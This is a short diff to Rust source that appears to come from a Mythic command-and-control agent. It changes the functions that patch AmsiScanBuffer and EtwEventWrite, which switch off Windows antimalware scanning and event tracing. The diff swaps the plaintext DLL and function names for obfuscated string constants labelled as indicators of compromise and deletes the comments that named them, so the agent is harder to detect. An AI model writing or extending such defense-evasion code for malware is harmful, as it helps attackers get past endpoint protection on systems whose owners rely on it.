@@ -24,8 +24,7 @@ pub fn amsi_patch(
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
 
     unsafe {
-        // Resolve AmsiScanBuffer from amsi.dll
-        let amsi_scan_buffer = match crate::syscalls::resolve_function("amsi.dll", "AmsiScanBuffer").map(|a| a as *mut std::ffi::c_void) {
+        let amsi_scan_buffer = match crate::syscalls::resolve_function(&crate::obfstr::d(crate::obfstr::IOC_AMSI_DLL), &crate::obfstr::d(crate::obfstr::IOC_AMSI_FUNC)).map(|a| a as *mut std::ffi::c_void) {
             Some(ptr) => ptr,
             None => {
                 tx.send(mythic_error!(task.id, format!("{}: Failed to resolve AmsiScanBuffer",
@@ -81,8 +80,7 @@ pub fn etw_patch(
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
 
     unsafe {
-        // Resolve EtwEventWrite from ntdll.dll
-        let etw_event_write = match crate::syscalls::resolve_function("ntdll.dll", "EtwEventWrite").map(|a| a as *mut std::ffi::c_void) {
+        let etw_event_write = match crate::syscalls::resolve_function(&crate::obfstr::d(crate::obfstr::IOC_NTDLL), &crate::obfstr::d(crate::obfstr::IOC_ETW_FUNC)).map(|a| a as *mut std::ffi::c_void) {
             Some(ptr) => ptr,
             None => {
                 tx.send(mythic_error!(task.id, format!("{}: Failed to resolve EtwEventWrite",
